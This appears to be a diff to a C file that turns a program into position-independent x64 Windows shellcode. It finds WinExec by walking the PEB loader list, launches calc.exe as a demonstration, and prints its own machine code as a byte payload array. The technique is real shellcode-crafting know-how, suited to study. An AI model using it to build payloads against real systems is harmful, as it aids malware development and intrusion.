@@ -1,5 +1,8 @@
 #include "shellcode.h"
 
+//  x86_64-w64-mingw32-gcc .\shellcode.c -O -masm=intel -o shellcode.exe -Wno-int-conversion
+
+
 // we gonna access the function called Beep from
 // kernel32.dll and execute it 
 
@@ -44,7 +47,7 @@ inline __attribute__((always_inline)) HANDLE ft_LoadLib( char *name)
     PEB    *peb;
     
    __asm__ (
-    "mov eax, fs:[0x30];"
+    "mov rax, gs:[0x60];"
     : "=r"(peb)
     );
     PPEB_LDR_DATA pipi = (PPEB_LDR_DATA)peb->Ldr;
@@ -65,10 +68,52 @@ inline __attribute__((always_inline)) HANDLE ft_LoadLib( char *name)
 
 typedef UINT(WINAPI *WinExec_t)(LPCSTR lpCmdLine, UINT uCmdShow);
 
-
 int main()
 {
-    
-    WinExec_t pWinExec = (WinExec_t) Lgetprocadd(ft_LoadLib("KERNEL32.DLL"), "WinExec");;
-	pWinExec("calc", 0 );
+	PVOID pvStartAddress = NULL;
+	PVOID pvEndAddress = NULL;
+	
+     __asm("StartAddress:;");
+	//Align the stack
+	__asm__("and rsp, 0xfffffffffffffff0 ;"
+		  "mov rbp, rsp;"
+		  "sub rsp, 0x200" // allocate stack space, arbitrary size...depends on payload
+	);
+    CHAR    ker_ll[] = "KERNEL32.DLL\0";
+    CHAR    wine_ec[] = "WinExec\0";
+    CHAR    cal_c[]  = "calc.exe\0";
+
+
+    WinExec_t pWinExec = (WinExec_t) Lgetprocadd(ft_LoadLib(ker_ll), wine_ec);;
+	pWinExec(cal_c, 0 );
+
+
+    __asm("add rsp, 0x200;"); // Cleanup stack
+	__asm("EndAddress:;");
+	
+	__asm("lea %0, [rip+StartAddress];"
+	:"=r"(pvStartAddress)
+	);
+	
+	__asm("lea %0, [rip+EndAddress];"
+	:"=r"(pvEndAddress)
+	);
+
+	printf("Start address: %p\n", pvStartAddress);
+	printf("End address: %p\n", pvEndAddress);
+	
+    CONST UCHAR* pStart = (CONST UCHAR*)pvStartAddress;
+    CONST UCHAR* pEnd = (CONST UCHAR*)pvEndAddress;
+
+	printf("UCHAR payload[] = {");
+    while (pStart < (pEnd-1)) {
+        printf("\\x%02x", *pStart);
+        pStart++;
+    }
+	printf("\\x%02x", *pStart);
+	printf("};\n");
+
+	
+    return 0;
+   
 }
